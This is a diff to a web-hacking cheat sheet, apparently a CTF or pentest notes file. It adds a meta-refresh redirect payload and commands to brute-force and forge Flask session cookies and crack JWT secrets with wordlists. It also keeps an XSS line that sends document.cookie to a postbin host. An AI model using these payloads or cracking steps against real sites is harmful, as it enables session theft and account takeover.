@@ -5,17 +5,19 @@
 
 ---
 
-- [BruteForce](#bruteforce)
 - [CMS](#cms)
 - [Certificate](#certificate)
+- [Cookies](#cookies)
+- [Discovery Tool](#discovery-tool)
 - [Download .git](#download-git)
 - [Interesting routes](#interesting-routes)
+- [Nosql Injection](#nosql-injection)
 - [Path traversal (LFI)](#path-traversal-lfi)
 - [PhpMyAdmin](#phpmyadmin)
 - [Request](#request)
-- [Server Side XSS](#server-side-xss)
 - [SQL Injection](#sql-injection)
 - [SSTI](#ssti)
+- [Server Side XSS](#server-side-xss)
 - [XML external entity (XXE)](#xml-external-entity-xxe)
 - [XSS Injection](#xss-injection)
 
@@ -342,6 +344,11 @@ ${{1+1}}
 <script>fetch('https://www.toptal.com/developers/postbin/123-123?' + btoa(document.cookie), { method: 'GET',})</script>
 ```
 
+### Meta
+```html
+<meta http-equiv="refresh" content="0;url=http://example.com">
+```
+
 ### Object
 ```html
 <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
@@ -349,6 +356,7 @@ ${{1+1}}
 
 ### Useful Link
 - [Toptal/postbin - Exfiltrate information](https://www.toptal.com/developers/postbin/)
+- [Generate Tags](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 - [CSP Evalutor](https://csp-evaluator.withgoogle.com/)
 - [XSS Payload List](https://github.com/payloadbox/xss-payload-list)
 
@@ -376,6 +384,41 @@ You can extract annotation files with this [script](https://github.com/sawyerf/H
 pip3 install pymupdf
 python3 script/get-pdf-annot.py -f "<HTTP(S)_URL> OR <PDF_PATH>"
 ```
+
+# Cookies
+## Flask
+### Decode
+```bash
+flask-unsign --decode --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
+```
+
+### Bruteforce
+```bash
+flask-unsign --wordlist /usr/share/wordlists/rockyou.txt --unsign  --no-literal-eval --cookie 'eyJ1c2VyIjoiYWRtaW4ifQ.Y4za7g.ZHmbIsx0-wdFV_IgyWI7MruY9OY'
+```
+
+### Encode
+```bash
+flask-unsign --sign --cookie "{'user': 'admin'}" --secret 'mySecret'
+```
+
+## Json Web Token (JWT)
+> A JWT comes in this structure, aaaaaa.bbbbbb.ccccc. aaaaaaa represents the header, bbbbb represents the payload while cccccc represents the signature.
+> 
+> [Source](https://krevetk0.medium.com/brute-forcing-jwt-token-hs256-6f545d24c7c3)
+
+### Encode / Decode
+- [JWT.io](https://jwt.io/)
+
+### Brute Force
+```bash
+jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Fw4maeqOtL8pPwiI2_VzYBo4JQ91P1Ow3X3hNqx2wPg" < words/rockyou.txt
+```
+```bash
+hashcat -r words/hob064.rule words/rockyou.txt --stdout | jwtcrack "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzb21lIjoicGF5bG9hZCJ9.Uzr5ePfZFgmvhMFYJ9WAYISmGLj7JE7SWO43OrfmcZM"
+```
+- [Github](https://github.com/ojensen5115/jwtcrack)
+
 
 # Request
 > Different tool to make a http request.
